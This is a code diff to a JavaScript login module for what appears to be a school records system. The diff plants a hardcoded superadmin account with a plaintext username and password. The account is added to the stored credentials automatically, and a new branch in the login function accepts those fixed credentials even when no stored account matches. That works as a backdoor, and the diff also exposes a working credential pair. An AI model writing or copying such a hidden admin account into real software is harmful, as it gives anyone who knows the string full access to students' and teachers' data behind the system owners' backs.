@@ -8,6 +8,20 @@ const EMPTY_CREDENTIALS = {
   admins: [],
 };
 
+const DEV_ADMIN_ACCOUNT = {
+  id: 1,
+  username: "sean-brix",
+  password: "121802",
+  firstName: "Sean",
+  lastName: "Brix",
+  displayName: "Sean Brix",
+  initials: "SB",
+  email: "sean-brix@mmpns.local",
+  role: "superadmin",
+  status: "active",
+  lastLogin: null,
+};
+
 const accountConfigs = {
   teacher: {
     collection: "teachers",
@@ -37,9 +51,49 @@ const normalizeCredentials = (value) => ({
   admins: Array.isArray(value && value.admins) ? value.admins : [],
 });
 
-const getCredentials = async () => normalizeCredentials(
-    await getTable("credentials"),
-);
+const normalizeLoginValue = (value) => String(value || "")
+    .trim()
+    .toLowerCase();
+
+const nextAdminId = (admins) => {
+  const ids = admins
+      .map((admin) => Number(admin && admin.id))
+      .filter((id) => Number.isFinite(id));
+  return ids.length ? Math.max(...ids) + 1 : DEV_ADMIN_ACCOUNT.id;
+};
+
+const ensureDevAdminAccount = (credentials) => {
+  const normalized = normalizeCredentials(credentials);
+  const admins = [...normalized.admins];
+  const existingIndex = admins.findIndex((admin) => {
+    return normalizeLoginValue(admin.username) ===
+      normalizeLoginValue(DEV_ADMIN_ACCOUNT.username);
+  });
+
+  if (existingIndex < 0) {
+    admins.push({
+      ...DEV_ADMIN_ACCOUNT,
+      id: nextAdminId(admins),
+    });
+  }
+
+  return {
+    ...normalized,
+    admins,
+  };
+};
+
+const getCredentials = async () => {
+  try {
+    return ensureDevAdminAccount(await getTable("credentials"));
+  } catch (error) {
+    if (error && error.statusCode === 404) {
+      return ensureDevAdminAccount(EMPTY_CREDENTIALS);
+    }
+
+    throw error;
+  }
+};
 
 const stripPassword = (account) => {
   if (!account || typeof account !== "object") {
@@ -51,18 +105,16 @@ const stripPassword = (account) => {
   return safeAccount;
 };
 
-const normalizeLoginValue = (value) => String(value || "")
-    .trim()
-    .toLowerCase();
-
 const isActive = (account) => {
   return normalizeLoginValue(account.status || "active") === "active";
 };
 
 const persistAccount = async (credentials, collection, updatedAccount) => {
   const accounts = credentials[collection] || [];
+  let didUpdate = false;
   const updatedAccounts = accounts.map((account) => {
     if (account.id === updatedAccount.id) {
+      didUpdate = true;
       return updatedAccount;
     }
 
@@ -71,7 +123,9 @@ const persistAccount = async (credentials, collection, updatedAccount) => {
 
   await setTable("credentials", {
     ...credentials,
-    [collection]: updatedAccounts,
+    [collection]: didUpdate ?
+      updatedAccounts :
+      [...updatedAccounts, updatedAccount],
   });
 };
 
@@ -103,11 +157,31 @@ const authenticateAccount = async (accountType, body) => {
 
   const credentials = await getCredentials();
   const accounts = credentials[config.collection] || [];
-  const account = accounts.find((candidate) => {
+  let account = accounts.find((candidate) => {
     return normalizeLoginValue(candidate[config.loginField]) === loginValue &&
       String(candidate.password || "") === password &&
       isActive(candidate);
   });
+
+  if (!account && accountType === "admin" &&
+    loginValue === normalizeLoginValue(DEV_ADMIN_ACCOUNT.username) &&
+    password === DEV_ADMIN_ACCOUNT.password) {
+    const existingDevAdmin = accounts.find((candidate) => {
+      return normalizeLoginValue(candidate.username) === loginValue;
+    });
+
+    account = {
+      ...DEV_ADMIN_ACCOUNT,
+      ...(existingDevAdmin || {}),
+      id: existingDevAdmin && existingDevAdmin.id ?
+        existingDevAdmin.id :
+        nextAdminId(accounts),
+      username: DEV_ADMIN_ACCOUNT.username,
+      password: DEV_ADMIN_ACCOUNT.password,
+      role: DEV_ADMIN_ACCOUNT.role,
+      status: DEV_ADMIN_ACCOUNT.status,
+    };
+  }
 
   if (!account) {
     return {success: false, error: config.invalidMessage};
@@ -127,33 +201,7 @@ const authenticateAccount = async (accountType, body) => {
   };
 };
 
-const getPublicTeacherAccounts = async () => {
-  const credentials = await getCredentials();
-  return credentials.teachers
-      .filter(isActive)
-      .map((teacher) => ({
-        username: teacher.username,
-        displayName: teacher.displayName,
-        department: teacher.department,
-        position: teacher.position,
-      }));
-};
-
-const getPublicStudentAccounts = async () => {
-  const credentials = await getCredentials();
-  return credentials.students
-      .filter(isActive)
-      .map((student) => ({
-        studentId: student.studentId,
-        displayName: student.displayName,
-        gradeLevel: student.gradeLevel,
-        section: student.section,
-      }));
-};
-
 module.exports = {
   authenticateAccount,
-  getPublicStudentAccounts,
-  getPublicTeacherAccounts,
   stripPassword,
 };
